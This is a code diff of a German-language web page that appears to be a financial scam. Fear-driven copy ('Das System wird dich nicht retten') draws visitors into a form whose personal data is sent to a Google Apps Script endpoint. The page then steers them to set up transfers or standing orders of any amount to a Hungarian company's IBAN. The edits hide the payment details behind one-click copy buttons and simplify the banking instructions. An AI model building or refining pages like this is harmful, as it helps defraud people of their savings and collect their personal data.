@@ -18,15 +18,16 @@ body {
   background: white;
   padding: 20px;
   box-sizing: border-box;
-  text-align: center;
 }
 
 h2 {
   font-size: 22px;
+  text-align: center;
 }
 
 p {
   font-size: 15px;
+  text-align: center;
 }
 
 input {
@@ -38,13 +39,13 @@ input {
 }
 
 button {
-  padding: 14px;
   width: 100%;
-  font-size: 16px;
+  padding: 14px;
+  margin-top: 10px;
   background: black;
   color: white;
   border: none;
-  margin-top: 8px;
+  font-size: 16px;
 }
 
 .copyBtn {
@@ -52,7 +53,8 @@ button {
 }
 
 #loader {
-  display:none;
+  display: none;
+  text-align: center;
 }
 
 .spinner {
@@ -62,11 +64,17 @@ button {
   width: 40px;
   height: 40px;
   animation: spin 1s linear infinite;
-  margin: auto;
+  margin: 20px auto;
 }
 
 @keyframes spin {
   100% { transform: rotate(360deg); }
+}
+
+@media (max-width: 480px) {
+  .container { padding: 15px; }
+  h2 { font-size: 20px; }
+  p { font-size: 14px; }
 }
 </style>
 </head>
@@ -75,7 +83,7 @@ button {
 
 <div class="container">
 
-<h2>Schütze dein Vermögen, bevor es zu spät ist</h2>
+<h2>Schütze dein Vermögen bevor es zu spät ist</h2>
 <p><strong>Das System wird dich nicht retten.</strong><br>
 Sichere dich jetzt selbst ab – in unter 60 Sekunden.</p>
 
@@ -103,29 +111,19 @@ Ich bestätige die Richtigkeit meiner Angaben
 
 <div id="result" style="display:none;">
 
-<h3>Deine persönliche ID</h3>
-<p id="kundenId"></p>
-<button class="copyBtn" onclick="copyID()">ID kopieren</button>
+<h3>Dein nächster Schritt</h3>
 
-<h3>Überweisungsdaten</h3>
+<button class="copyBtn" onclick="copyIBAN()">1. IBAN kopieren</button>
+<button class="copyBtn" onclick="copyName()">2. Empfänger kopieren</button>
+<button class="copyBtn" onclick="copyID()">3. Verwendungszweck (ID) kopieren</button>
 
-<p id="empfaenger">M&M Marketing Kft</p>
-<button class="copyBtn" onclick="copyEmpfaenger()">Empfänger kopieren</button>
-
-<p id="iban">HU94120111480189343900200001</p>
-<button class="copyBtn" onclick="copyIBAN()">IBAN kopieren</button>
-
-<p>BIC: UBRTHUHB</p>
-<p>Verwendungszweck: <span id="vwz"></span></p>
-<p>Betrag frei wählbar</p>
-
-<h3>So geht's</h3>
-<p style="text-align:left;">
-1. Banking-App öffnen<br>
-2. Dauerauftrag oder Überweisung auswählen<br>
-3. IBAN kopieren und in die Banking-App einfügen<br>
+<h3>Anleitung</h3>
+<p>
+1. Öffne deine Banking-App<br>
+2. Wähle „Überweisung“ oder „Dauerauftrag“<br>
+3. IBAN kopieren und einfügen<br>
 4. Zahlungsempfänger kopieren und einfügen<br>
-5. ID kopieren und als Verwendungszweck setzen
+5. ID kopieren und als Verwendungszweck einsetzen
 </p>
 
 </div>
@@ -137,6 +135,7 @@ Ich bestätige die Richtigkeit meiner Angaben
 const scriptURL = "https://script.google.com/macros/s/AKfycbxgLEuiVpStD0TcPxuRY7wuNiv7V8yU2XkAaeeesCAiWKEgSXGc3AmIfBZzl5g4M-g3hg/exec";
 
 let isSubmitting = false;
+let currentID = "";
 
 function generateID() {
   const d = new Date();
@@ -157,6 +156,7 @@ document.getElementById("form").style.display="none";
 document.getElementById("loader").style.display="block";
 
 const id = generateID();
+currentID = id;
 
 const data = {
   vorname: document.getElementById("vorname").value,
@@ -175,27 +175,22 @@ fetch(scriptURL,{
 });
 
 setTimeout(() => {
-
   document.getElementById("loader").style.display="none";
   document.getElementById("result").style.display="block";
-
-  document.getElementById("kundenId").innerText = id;
-  document.getElementById("vwz").innerText = id;
-
 }, 1200);
 
 });
 
 function copyIBAN(){
-navigator.clipboard.writeText("HU94120111480189343900200001");
+  navigator.clipboard.writeText("HU94120111480189343900200001");
 }
 
-function copyEmpfaenger(){
-navigator.clipboard.writeText("M&M Marketing Kft");
+function copyName(){
+  navigator.clipboard.writeText("M&M Marketing Kft");
 }
 
 function copyID(){
-navigator.clipboard.writeText(document.getElementById("kundenId").innerText);
+  navigator.clipboard.writeText(currentID);
 }
 
 </script>
